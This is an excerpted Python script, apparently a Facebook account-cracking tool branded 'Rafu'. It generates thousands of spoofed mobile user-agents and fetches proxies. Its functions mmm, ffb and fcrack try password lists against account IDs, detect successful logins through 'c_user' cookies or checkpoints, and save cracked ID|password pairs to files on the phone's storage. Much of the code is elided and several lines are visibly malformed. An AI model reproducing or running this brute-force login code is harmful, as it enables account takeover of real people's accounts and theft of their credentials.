...
for xd in range(5000):
        ...
        ugen.append(uaku2)
try:
        prox= requests.get('https://github.com/Rafu69/.Rafu-proxy.txt').text
...
for xd in range(10000):
        ...
        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'   g=random.randrange(1, 9)
...
for xd in range(3000):
        ...
        ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"        ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
...
def uaku():
        try:
                ua=open('bbnew.txt','r').read().splitlines()                for ub in ua:
                        ugen.append(ub)
        except:
...
logo=("""
      \033[92;1mdb    ___ ___  ____           ____    ____  _____  __ __  
      \033[97;1m|  |   ||    \         |    \  /    ||     ||  |  |
       \033[92;1m| _   _ ||  D  )        |  D  )|  o  ||   __||  |  |
       \033[97;1m.|  \_/  ||    /         |    / |     ||  |_  |  |  |
      \033[92;1m.|   |   ||    \  __     |    \ |  _  ||   _] |  :  |
      \033[97;1m|   |   ||  .  \|  |    |  .  \|  |  ||  |   |     |
       \033[97:1m|___|___||__|\_||__|    |__|\_||__|__||__|  \__,_|
\033[91;1m--------------------------------------------------\033[97;1m>>     Owner    : Riyad Mahfuz
\033[97;1m>>     Facebook : MD Sabbir Hossain Rafi
\033[97;1m>>     Version  : 1.0
\033[97;1m>>     Git hop  : rafu0078
...
def fia():
                        print(logo)
                        print('\x1b[97;1m>>> RAFU  VERSION :\x1b[1;92m 1.1 ')
...
def mmm(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[Rafu] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAHBAZ:
                                print('\r\r\033[1;31m[Rafu-CP] %s | %s'%(ids,pas))

                                open('\x1b[91;1m/sdcard/Rafu-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Rafu:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;92m[Rafu-OK] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/Rafu-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[Rafu] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAHBAZ:
                                ...
                                print('\r\r\033[1;32m[Rafu-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m[Rafu-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/Rafu-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def fcrack(uid,pwx,tl):
        ...
        try:
                for ps in pwx:
                        session = requests.Session()
                        sys.stdout.write(f'\r [\033[1;97mRafu\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
                        sys.stdout.flush()
                        ua = random.choice(ugen)
    ...
    'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                cid = coki[151:166]
                                print('\33[38;5;208m[Rafu-CP] '+uid+' | '+ps+'\033[1;32m')
                                ...
                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                cid = coki[141:156]
                                print('\x1b[1;92m[Rafu-OK] '+uid+' | '+ps+'\33[0;97m')
